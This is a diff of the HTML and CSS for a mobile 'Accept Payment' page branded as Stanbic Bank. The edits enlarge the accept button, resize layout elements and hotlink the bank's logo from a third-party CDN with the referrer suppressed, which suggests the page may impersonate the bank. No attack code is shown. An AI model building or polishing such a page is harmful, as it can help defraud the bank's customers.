@@ -36,45 +36,40 @@
   }
 
   /* ══════════════════════════════════════════════════════
-     HEADER — Logo at top with text fallback
+     HEADER — Logo + text, both always visible
      ══════════════════════════════════════════════════════ */
   .header {
     flex-shrink: 0; background: var(--sb-white);
-    padding: max(20px, env(safe-area-inset-top, 0px)) 20px 16px;
+    padding: max(20px, env(safe-area-inset-top, 0px)) 20px 18px;
     border-bottom: 1px solid var(--sb-border);
     display: flex; align-items: center; justify-content: space-between;
     gap: 12px;
   }
   .brand-block {
-    display: flex; align-items: center; gap: 8px;
-    min-height: 34px;
+    display: flex; align-items: center; gap: 10px;
   }
   .header-logo {
-    height: 34px; width: auto; display: block;
+    height: 38px; width: auto; display: block;
+    flex-shrink: 0;
   }
-  /* Text fallback — only shows if image fails */
   .brand-text {
-    display: none;
-    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
-    color: var(--sb-primary);
-    line-height: 1;
+    font-size: 21px; font-weight: 800; letter-spacing: -0.5px;
+    color: var(--sb-primary); line-height: 1;
+    white-space: nowrap;
   }
   .brand-text .dot { color: var(--sb-gold); }
-  /* When image fails, swap */
-  .header-logo.broken { display: none; }
-  .header-logo.broken + .brand-text { display: block; }
 
-  .header-actions { display: flex; gap: 8px; }
+  .header-actions { display: flex; gap: 8px; flex-shrink: 0; }
   .header-btn {
     display: inline-flex; align-items: center; justify-content: center;
-    width: 38px; height: 38px;
+    width: 40px; height: 40px;
     border-radius: 8px; border: 1px solid var(--sb-border);
     background: var(--sb-white); color: var(--sb-primary);
     cursor: pointer; transition: all .15s;
   }
   .header-btn:hover { border-color: var(--sb-primary); background: #F6F8FC; }
   .header-btn.copied { background: var(--sb-green); border-color: var(--sb-green); color: #fff; }
-  .header-btn svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; }
+  .header-btn svg { width: 17px; height: 17px; stroke: currentColor; fill: none; stroke-width: 2; }
 
   /* ══════════════════════════════════════════════════════
      HERO
@@ -124,7 +119,7 @@
   .amount-card {
     background: var(--sb-soft); border-radius: 14px;
     border: 1px solid var(--sb-border);
-    padding: 18px 20px; margin-bottom: 22px;
+    padding: 20px 20px; margin-bottom: 24px;
   }
   .amount-card .label {
     font-size: 11px; color: var(--sb-muted); font-weight: 700;
@@ -132,33 +127,46 @@
     margin-bottom: 6px; display: block;
   }
   .amount-card .amount {
-    font-size: 34px; font-weight: 800; color: var(--sb-primary);
+    font-size: 36px; font-weight: 800; color: var(--sb-primary);
     letter-spacing: -1px; line-height: 1.1; display: block;
   }
 
-  /* BUTTON — full width, generous */
+  /* ═══ BUTTON — BIG, unmissable ═══ */
   .btn-accept {
-    width: 100%; height: 56px;
-    background: var(--sb-primary); color: #fff;
-    font-family: inherit; font-size: 16px; font-weight: 800;
+    width: 100%;
+    min-height: 68px;
+    padding: 20px 24px;
+    background: var(--sb-primary);
+    color: #fff;
+    font-family: inherit;
+    font-size: 18px;
+    font-weight: 800;
     letter-spacing: 0.3px;
-    border: none; border-radius: 12px; cursor: pointer;
-    box-shadow: 0 8px 20px rgba(1,0,140,0.25);
+    text-transform: none;
+    line-height: 1.2;
+    border: none;
+    border-radius: 14px;
+    cursor: pointer;
+    box-shadow: 0 10px 26px rgba(1,0,140,0.32);
     transition: filter .15s, transform .1s, box-shadow .15s;
-    margin-bottom: 24px;
-    display: flex; align-items: center; justify-content: center;
-    gap: 10px;
+    margin-bottom: 26px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
   }
-  .btn-accept:hover { filter: brightness(1.08); box-shadow: 0 10px 24px rgba(1,0,140,0.32); }
-  .btn-accept:active { transform: scale(0.985); }
+  .btn-accept:hover { filter: brightness(1.10); box-shadow: 0 12px 30px rgba(1,0,140,0.40); }
+  .btn-accept:active { transform: scale(0.98); }
   .btn-accept:disabled { opacity: 0.65; cursor: wait; }
   .btn-accept svg {
-    width: 20px; height: 20px; stroke: currentColor; fill: none;
-    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+    width: 24px; height: 24px;
+    stroke: currentColor; fill: none;
+    stroke-width: 2.6; stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
   }
 
   /* RECIPIENT */
-  .recipient-section { margin-bottom: 20px; }
+  .recipient-section { margin-bottom: 22px; }
   .recipient-label-row {
     font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
     text-transform: uppercase; color: var(--sb-muted);
@@ -166,7 +174,7 @@
   }
   .recipient-row {
     display: flex; align-items: center; justify-content: space-between;
-    gap: 14px; padding: 13px 16px;
+    gap: 14px; padding: 14px 16px;
     background: var(--sb-soft); border-radius: 10px;
     border: 1px solid var(--sb-border);
     margin-bottom: 8px;
@@ -183,7 +191,7 @@
 
   /* DETAILS */
   .details-panel {
-    width: 100%; margin-bottom: 22px;
+    width: 100%; margin-bottom: 24px;
     background: var(--sb-white); border-radius: 14px;
     border: 1px solid var(--sb-border);
     overflow: hidden;
@@ -191,22 +199,22 @@
   .details-panel .panel-title {
     font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
     text-transform: uppercase; color: var(--sb-muted);
-    padding: 14px 20px 8px;
+    padding: 14px 20px 10px;
     background: var(--sb-soft);
     border-bottom: 1px solid var(--sb-border);
   }
   .details-panel .panel-body { padding: 4px 20px 8px; }
   .detail-row {
     display: flex; justify-content: space-between; align-items: flex-start;
-    gap: 12px; padding: 12px 0;
+    gap: 12px; padding: 13px 0;
     border-bottom: 1px solid var(--sb-border);
   }
   .detail-row:last-child { border-bottom: none; }
   .detail-row .k {
-    font-size: 11.5px; color: var(--sb-muted); flex-shrink: 0; font-weight: 500;
+    font-size: 12px; color: var(--sb-muted); flex-shrink: 0; font-weight: 500;
   }
   .detail-row .v {
-    font-size: 12.5px; font-weight: 700; text-align: right;
+    font-size: 13px; font-weight: 700; text-align: right;
     word-break: break-word; color: var(--sb-text);
   }
   .detail-row.purpose-row .k { color: #8A6600; }
@@ -222,21 +230,18 @@
     gap: 14px;
   }
   .footer-brand {
-    display: flex; align-items: center; gap: 6px;
-    min-height: 26px;
+    display: flex; align-items: center; gap: 8px;
   }
   .foot-logo {
-    height: 26px; width: auto; display: block;
-    filter: brightness(0) invert(1);
+    height: 30px; width: auto; display: block;
+    flex-shrink: 0;
   }
   .foot-brand-text {
-    display: none;
-    font-size: 18px; font-weight: 800; letter-spacing: -0.4px;
+    font-size: 17px; font-weight: 800; letter-spacing: -0.4px;
     color: #fff; line-height: 1;
+    white-space: nowrap;
   }
   .foot-brand-text .dot { color: var(--sb-gold); }
-  .foot-logo.broken { display: none; }
-  .foot-logo.broken + .foot-brand-text { display: block; }
 
   .sb-footer .foot-support {
     font-size: 11px; color: rgba(255,255,255,0.75); line-height: 1.5; font-weight: 500;
@@ -304,30 +309,29 @@
   }
 
   /* RESPONSIVE */
-  @media (pointer: coarse) {
-    .btn-accept { height: 58px; font-size: 16px; }
-  }
   @media (max-width: 380px) {
     .header { padding-top: max(16px, env(safe-area-inset-top, 0px)); padding-bottom: 14px; }
-    .header-logo { height: 28px; }
-    .brand-text { font-size: 20px; }
+    .header-logo { height: 32px; }
+    .brand-text { font-size: 18px; }
     .header-btn { width: 36px; height: 36px; }
+    .header-btn svg { width: 15px; height: 15px; }
     .hero { padding: 18px 18px 22px; }
     .hero-title { font-size: 20px; }
     .body { padding: 18px 18px 20px; }
-    .amount-card { padding: 16px 18px; margin-bottom: 18px; }
-    .amount-card .amount { font-size: 28px; }
-    .btn-accept { height: 52px; font-size: 15px; margin-bottom: 20px; }
+    .amount-card { padding: 18px 18px; margin-bottom: 20px; }
+    .amount-card .amount { font-size: 30px; }
+    .btn-accept { min-height: 62px; padding: 18px 20px; font-size: 17px; margin-bottom: 22px; }
+    .btn-accept svg { width: 22px; height: 22px; }
     .recipient-row { padding: 12px 14px; }
     .recipient-row .v { font-size: 13px; }
     .details-panel .panel-title { padding: 12px 16px 8px; }
     .details-panel .panel-body { padding: 4px 16px 8px; }
-    .detail-row { padding: 11px 0; }
-    .detail-row .k { font-size: 11px; }
-    .detail-row .v { font-size: 12px; }
+    .detail-row { padding: 12px 0; }
+    .detail-row .k { font-size: 11.5px; }
+    .detail-row .v { font-size: 12.5px; }
     .sb-footer { padding: 16px 18px; }
-    .foot-logo { height: 22px; }
-    .foot-brand-text { font-size: 16px; }
+    .foot-logo { height: 26px; }
+    .foot-brand-text { font-size: 15px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -344,16 +348,16 @@
 
 <div class="phone">
 
-  <!-- HEADER with fallback -->
+  <!-- HEADER — Logo (image) + text, both visible -->
   <div class="header">
     <div class="brand-block">
       <img
         class="header-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/light/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
-        onerror="this.classList.add('broken')"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank logo"
+        referrerpolicy="no-referrer"
       >
-      <span class="brand-text">Stanbic Bank<span class="dot">.</span></span>
+      <span class="brand-text">Stanbic<span class="dot">.</span></span>
     </div>
     <div class="header-actions">
       <button class="header-btn" id="copyBtn" onclick="copyReceipt()" aria-label="Copy receipt">
@@ -383,6 +387,7 @@
       <span class="amount" id="amountValue">—</span>
     </div>
 
+    <!-- BIG BUTTON -->
     <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">
       <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
       <span id="acceptBtnLabel">Accept Payment</span>
@@ -410,10 +415,10 @@
         <img
           class="foot-logo"
           src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-          alt="Stanbic Bank"
-          onerror="this.classList.add('broken')"
+          alt="Stanbic Bank logo"
+          referrerpolicy="no-referrer"
         >
-        <span class="foot-brand-text">Stanbic Bank<span class="dot">.</span></span>
+        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
       </div>
       <div class="foot-support">
         <span id="helpLabel">Customer Care</span><br>
